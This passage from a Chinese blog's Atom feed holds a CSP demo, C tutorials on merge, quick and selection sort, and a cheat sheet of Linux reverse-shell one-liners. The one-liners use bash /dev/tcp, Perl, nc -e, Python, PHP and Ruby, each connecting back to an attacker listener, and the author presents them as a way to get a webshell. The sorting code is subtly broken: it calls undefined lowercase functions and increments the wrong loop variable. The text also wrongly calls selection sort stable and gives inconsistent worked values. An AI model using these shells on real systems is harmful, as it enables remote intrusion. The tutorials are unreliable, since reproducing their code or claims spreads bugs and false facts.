example.com 任何子域的资源。</td></tr><tr><td>‘unsafe-inline’</td><td align="center">script-src ‘unsafe-inline’</td><td align="right">允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。</td></tr><tr><td>‘unsafe-eval’</td><td align="center">script-src ‘unsafe-eval’</td><td align="right">允许加载动态 js 代码，例如 eval()。</td></tr></tbody></table><h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p>定义CSP，图片资源只能从当前域名加载<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: img-src 'self'"</span>);</span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br></pre></td></tr></table></figure><br>输入<code>&lt;img src=1.jpeg &gt;</code>图片成功加载<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/01.png" alt=""><br>输入<code>&lt;img src=&quot;https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/01.png&quot; &gt;</code>图片加载被浏览器阻止，stasus显示为blocked:csp<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/02.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CSP策略虽然通过白名单限制了资源的加载，减少了XSS攻击，但也造成了：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本，并且需要浏览器支持CSP策略。如果使用CSP策略，开发者不得不使内嵌脚本和文档分离，但好在CSP使开发者减少了对XSS攻击的负担。<br>现在大多数浏览器都已支持CSP策略，大大减少了用户被广告骚扰和盗取cookie的风险。</p><h1 id="参见"><a href="#参见" class="headerlink" title="参见"></a>参见</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">Content-Security-Policy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;CSP策略全称为Content Security Policy，是以白名单的机制对网站加载或者执行的资源起作用。CSP通常以HTTP头信息或
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之归并排序</title>
    <link href="http://re0.top/2018/06/07/mergesort/"/>
    <id>http://re0.top/2018/06/07/mergesort/</id>
    <published>2018-06-07T12:22:00.000Z</published>
    <updated>2018-11-14T09:37:31.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>归并排序是种独立的排序，它通过分治法的思想的排序数组。将数组分治为有序的子序列，最后合并每个子序列，完成排序。<br>归并排序的时间复杂度同快速排序一致，为O(N*logN)，空间复杂度上归并排序则稳定为O(n)来存储临时数组。 </p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>要理解归并排序，需要先理解如何合并两个有序序列。<br>假设有以下有序序列：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr><tr><td>3</td><td>34</td><td>54</td><td>14</td><td>23</td><td>41</td></tr></table><br>先将序列对半分，分为3，34，54和14，23，41两组有序序列，比较两组序列的第一个数，哪个小就将其放在临时数组中，这里3小于14，便将3放在临时数组中，现在变成了如下序列</p><p><table><tr><td>34</td><td>54</td></tr></table></p><p><table><tr><td>14</td><td>23</td><td>41</td></tr></table><br>接着比较34与14，将14放在临时数组中，以此类推，直到两个序列都放入了临时数组。<br>由此写出代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MemeryArray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n, <span class="keyword">int</span> b[], <span class="keyword">int</span> m, <span class="keyword">int</span> c[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i, j, k;  </span><br><span class="line">  </span><br><span class="line">    i = j = k = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m)  <span class="comment">//将小的数放入临时数组</span></span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt; b[j])  </span><br><span class="line">            c[k++] = a[i++];  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            c[k++] = b[j++];   </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n)   <span class="comment">//若两个序列长度不同，则比较完成后直接将有序序列的数依次放入临时数组，下同</span></span><br><span class="line">        c[k++] = a[i++];  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (j &lt; m)  </span><br><span class="line">        c[k++] = b[j++];  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>那问题就来了，我们怎么得到两个有序序列来使它们合并呢？<br>我们可以将数组一直二分，直到序列中只有一个数，便可以得到一个数的有序序列。简而言之，先使用递归拆分序列，再合并序列。如此便实现了归并排序。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeArray</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> first,<span class="keyword">int</span> mid,<span class="keyword">int</span> last,<span class="keyword">int</span> temp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = first, j = mid + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">int</span> m = mid,   n = last;  </span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m &amp;&amp; j &lt;= n)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt;= a[j])  </span><br><span class="line">            temp[k++] = a[i++];  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            temp[k++] = a[j++];  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m)  </span><br><span class="line">        temp[k++] = a[i++];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n)  </span><br><span class="line">        temp[k++] = a[j++];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)  </span><br><span class="line">        a[first + i] = temp[i]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (first &lt; last)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> mid = (first + last) / <span class="number">2</span>;  </span><br><span class="line">        mergesort(a, first, mid, temp);  <span class="comment">//递归，使左边序列有序</span></span><br><span class="line">        mergesort(a, mid + <span class="number">1</span>, last, temp); <span class="comment">//使右边序列有序</span></span><br><span class="line">        mergearray(a, first, mid, last, temp); <span class="comment">//合并两个有序序列</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>归并排序效率还是比较高的，但速度上快速排序仍比归并排序来的快。笔者在自己电脑上进行测试：<br>20000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge3.png" alt=""><br>50000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge5.png" alt=""><br>100000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge2.png" alt=""><br>500000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;归并排序是种独立的排序，它通过分治法的思想的排序数组。将数组分治为有序的子序列，最后合并每个子序列，完成排序。&lt;br&gt;归并排序的时间复杂度同
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之快速排序</title>
    <link href="http://re0.top/2018/06/02/quicksort/"/>
    <id>http://re0.top/2018/06/02/quicksort/</id>
    <published>2018-06-02T11:20:28.000Z</published>
    <updated>2018-06-03T07:03:16.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>快速排序法在众多时间复杂度为N*logN的排序方法中效率极高，因此经常被使用。例如java中的Arrays.sort()还有python中的sort()都是采用优化过后的快速排序法。<br>要直接写出快速排序法并不简单，因此我写了这篇文章来谈谈对快速排序法的理解。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>快速排序是由C. A. R. Hoare在1962年提出的，是对冒泡排序法的一种改进。它的基本思想是：<br>1.从数组中取出一个数作为比较数。(一般为区间第一个数)<br>2.分区。将比这个数大的数放在它的右边，小于等于它的数放在左边。<br>3.再对左右两个分区进行第二步，知道各个分区只有一个数。<br>举个小数组的例子：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td></tr><tr><td style="color:red;">67</td><td>3</td><td>54</td><td>23</td><td>41</td><td>78</td><td>12</td><td>73</td></tr></table><br>初始时，i=0,j=7,X=a[i]=67<br>由于X等于第一个数，相当于在a[0]上挖了一个坑，可以将其他位置的数填到这里。<br>接着从j开始向前找到一个比X小或相等的数。当j=6时，条件符合。将a[6]的值赋给a[0]。然后i++。这样又在a[6]上挖了一个坑。<br>之后再从i开始找到一个比X大的数，当i=5符合条件，将a[6]=a[5],j- -。<br>此时数组变为：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td></tr><tr><td style="color:Violet;">12</td><td>3</td><td>54</td><td>23</td><td>41</td><td>78</td><td style="color:red;">78</td><td>73</td></tr></table><br>i=5,j=5,X=72；<br>如果i与j不相等，则重复上面的步骤，先从后往前找，再从前往后找。<br>当i==j时退出。<br>此时可以发现，在a[5]之前的数都小于它，在a[5]之后的数都大于它。之后再对0–4和6–7两个子区间进行上述步骤即可。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>由此我们便可写出挖坑填数的代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AdjustArray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> <span class="comment">//返回i==j时的数组下标</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i = left, j = right;  </span><br><span class="line">    <span class="keyword">int</span> x = a[left]; <span class="comment">//a[left]即为第一个数  </span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">// 从右向左找小于x的数来填a[i]  </span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; a[j] &gt;= x)   </span><br><span class="line">            j--;    </span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">        &#123;  </span><br><span class="line">            a[i] = a[j]; <span class="comment">//将a[j]填到a[i]中，a[j]就形成了一个新的坑</span></span><br><span class="line">            i++;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 从左向右找大于或等于x的数来填a[j]  </span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; a[i] &lt; x)  </span><br><span class="line">            i++;    </span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">        &#123;  </span><br><span class="line">            a[j] = a[i]; <span class="comment">//将a[i]填到a[j]中，a[i]就形成了一个新的坑  </span></span><br><span class="line">            j--;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//退出时，i等于j。将x填到这个坑中。  </span></span><br><span class="line">    a[i] = x;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> i;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (left &lt; right)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> i = AdjustArray(a, left, right);<span class="comment">//先成挖坑填数法调整a[]  </span></span><br><span class="line">        quick_sort(a, left, i - <span class="number">1</span>); <span class="comment">// 递归调用   </span></span><br><span class="line">        quick_sort(a, i + <span class="number">1</span>, right);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>对代码优化之后即可得到简洁的快速排序法：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (left &lt; right)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> i = left, j = right, x = a[left];  </span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; a[j] &gt;= x) <span class="comment">// 从右向左找第一个小于x的数  </span></span><br><span class="line">                j--;    </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">                a[i++] = a[j]; <span class="comment">//也可以不i++，无影响，下面j--同理</span></span><br><span class="line">              </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; a[i] &lt; x) <span class="comment">// 从左向右找第一个大于等于x的数  </span></span><br><span class="line">                i++;    </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">                a[j--] = a[i];  </span><br><span class="line">        &#125;  </span><br><span class="line">        a[i] = x;  </span><br><span class="line">        quick_sort(a, left, i - <span class="number">1</span>); <span class="comment">// 递归调用   </span></span><br><span class="line">        quick_sort(a, i + <span class="number">1</span>, right);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p><p>快速排序法在理解上并不是很难，网上还有许多优化过的版本，这里不再细谈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;快速排序法在众多时间复杂度为N*logN的排序方法中效率极高，因此经常被使用。例如java中的Arrays.sort()还有python中的
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Linux下反弹shell的几种方式</title>
    <link href="http://re0.top/2018/05/28/linux-shell/"/>
    <id>http://re0.top/2018/05/28/linux-shell/</id>
    <published>2018-05-28T12:40:34.000Z</published>
    <updated>2018-06-03T07:04:34.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在服务器基本上都是采用linux系统，做为一条web狗，最希望当然是拿到网站的webshell，之前看到过几种方法，在这里总结一下吧。<br>这里攻击端的ip为192.168.1.100,并且执行了<code>nc -lvvp 9999</code>，在9999端口进行监听。</p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><p>bash是linux最基本的东西，用bash来反弹shell是必须要清楚的。<br>    <code>bash -i &gt;&amp; /dev/tcp/192.168.1.100/9999 0&gt;&amp;1</code><br>这里的可选择的协议还有udp，但是一般采用的tcp协议。<br>这里的第一个&gt;&amp;是表示shell在后台运行。</p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><p>perl解释器在linux下基本也是预装的，但如今似乎用的人越来越少了，剩下它的正则表达式还在延续。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.1.100";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>nc命令在linux下也是常见的，不过docker里一般不会有nc。<br>    <code>nc -e /bin/sh 192.168.1.100 9999</code><br>-e代表程序重定向 将/bin/sh 重定向到远程端口</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><p>现在用python写后端的人也挺多的，有命令注入的话说不定可以直接搞事。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>php是世界上最好的语言！<br>    <code>php -r &#39;$sock=fsockopen(&quot;192.168.1.100&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><p>还记得之前某位老师说过Ruby会比python更火，然而现在身边会Ruby的人好像没多少。<br><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code><br>还有不依赖/bin/sh的shell<br><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>顺带一提如果在windows上要用Ruby反弹shell，则<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>不过我想我可能永远用不上。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>lua现在都没看见了，在这里便不列出来了。通常都是nc，python，php，bash用的较多一点。好像php的shell还有另一种形式，记性太差，想不起来了。之后再补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;现在服务器基本上都是采用linux系统，做为一条web狗，最希望当然是拿到网站的webshell，之前看到过几种方法，在这里总结一下吧。&lt;b
      
    
    </summary>
    
    
      <category term="linux" scheme="http://re0.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之选择排序</title>
    <link href="http://re0.top/2018/05/11/selectsort/"/>
    <id>http://re0.top/2018/05/11/selectsort/</id>
    <published>2018-05-11T11:20:28.000Z</published>
    <updated>2018-06-03T07:03:57.893Z</updated>
    
    <content type="html"><![CDATA[<p>最近都没时间写文章，想想还是得偶尔空出点时间来写文章学习点东西。<br>讲讲选择排序。<br>选择排序和冒泡排序都是比较基本的排序算法，下面就来简单说说选择排序的实现方法。<br>设数组的下标为[0…n-1]，i=0。刚开始整个数组都处于无序状态，在无序区中找到一个最小的数放在第i个位置，则现在[0..i]处于有序区，i++并重复步骤，直到i==n-1，则排序完成。</p><h2 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectsort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,MinIndex;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        MinIndex = i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[MinIndex])</span><br><span class="line">                MinIndex = j;</span><br><span class="line">        &#125;</span><br><span class="line">        Swap(a[i],a[MinIndex]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Swap的实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> &amp;b)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> c = a;  </span><br><span class="line">    a = b;  </span><br><span class="line">    b = c;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>选择排序和冒泡排序的时间复杂度都是n^2,并且都是稳定的排序，但当数组长度过大时，效率反而低下。下次讲讲时间复杂度也是n^2的插入排序法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近都没时间写文章，想想还是得偶尔空出点时间来写文章学习点东西。&lt;br&gt;讲讲选择排序。&lt;br&gt;选择排序和冒泡排序都是比较基本的排序算法，下面就来简单说说选择排序的实现方法。&lt;br&gt;设数组的下标为[0…n-1]，i=0。刚开始整个数组都处于无序状态，在无序区中找到一个最小的数
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
